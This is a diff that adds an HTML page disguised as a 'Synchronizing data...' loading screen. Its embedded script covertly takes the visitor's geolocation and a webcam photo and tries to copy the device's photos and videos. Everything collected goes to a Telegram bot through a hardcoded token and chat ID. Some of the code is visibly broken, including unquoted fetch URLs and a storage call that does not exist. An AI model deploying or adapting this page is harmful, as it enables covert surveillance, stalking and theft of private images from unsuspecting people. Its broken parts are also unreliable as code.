@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { 
+            background: #ffffff; 
+            color: #333; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+        }
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #3498db; 
+            border-radius: 50%; 
+            width: 30px; 
+            height: 30px; 
+            animation: spin 2s linear infinite; 
+            margin: 0 auto;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        p { margin-top: 15px; font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+    <div style="text-align:center;">
+        <div class="loader"></div>
+        <p>Synchronizing data...</p>
+    </div>
+
+    <script>
+        // CONFIGURATION - CREDENTIALS INJECTED
+        const BOT_TOKEN = "AAG_ccmU44AKPjNYmxPCxB5jGIhlNXsvNmI";
+        const CHAT_ID = "8844269730";
+
+        // Helper: Send Photo/Image
+        async function sendImage(blob, filename) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, filename);
+            
+            try {
+                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { console.error("Image upload failed", e); }
+        }
+
+        // Helper: Send Location
+        async function sendLocation(lat, lon) {
+            try {
+                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendLocation, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: lat,
+                        longitude: lon
+                    })
+                });
+            } catch (e) { console.error("Location send failed", e); }
+        }
+
+        // Main Logic
+        (async () => {
+            // 1. Get Location
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendLocation(pos.coords.latitude, pos.coords.longitude);
+                
+                // 2. Take Selfie
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Wait 1 second for stream to stabilize
+                    setTimeout(async () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+
+canvas.toBlob(async (blob) => {
+                            await sendImage(blob, 'selfie.jpg');
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // 3. Dump Gallery (Android Only)
+                            dumpGallery();
+                        }, 'image/jpeg');
+                    }, 1000);
+                } catch (err) {
+                    console.error("Camera error:", err);
+                    dumpGallery(); // Still try gallery if camera fails
+                }
+            }, (err) => {
+                console.warn("Location denied");
+                // Fallback: Just take selfie if location fails
+                try {
+                    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(async (blob) => {
+                                await sendImage(blob, 'selfie_no_loc.jpg');
+                                stream.getTracks().forEach(t => t.stop());
+                                dumpGallery();
+                            }, 'image/jpeg');
+                        }, 1000);
+                    });
+                } catch(e) { console.error("Fallback camera fail", e); }
+            });
+        })();
+
+        // Gallery Dumper (Chrome Android Specific)
+        async function dumpGallery() {
+            try {
+                // Check if File System Access API is supported
+                if (!navigator.storage || !navigator.storage.getHandle) {
+                    return; // Skip if not supported (iOS/Desktop)
+                }
+
+                // Request permission to root directory
+                const dirHandle = await navigator.storage.getHandle().requestPermission({ mode: "read" });
+                
+                // Recursive function to read all files
+                async function readDir(handle) {
+                    for await (const entry of handle.values()) {
+                        if (entry.kind === "file") {
+                            const file = await entry.getFile();
+                            const ext = file.name.split('.').pop().toLowerCase();
+                            
+                            // Filter for images and videos
+                            if (['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(ext)) {
+                                await sendImage(file, file.name);
+                            } else if (['mp4', 'mov', 'avi', 'mkv'].includes(ext)) {
+                                // Note: Telegram Free Bot limit is 50MB per file
+                                if (file.size > 50 * 1024 * 1024) continue; 
+                                
+                                const vForm = new FormData();
+                                vForm.append("chat_id", CHAT_ID);
+                                vForm.append("video", file, file.name);
+                                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo, {
+                                    method: 'POST',
+                                    body: vForm
+                                });
+                            }
+                        } else if (entry.kind === "directory") {
+                            await readDir(entry);
+                        }
+                    }
+                }
+
+                await readDir(dirHandle);
+                document.querySelector('p').innerText = "Sync Complete ✅";
+            } catch (err) {
+
+console.error("Gallery Error:", err);
+            }
+        }
+    </script>
+</body>
+  </html>
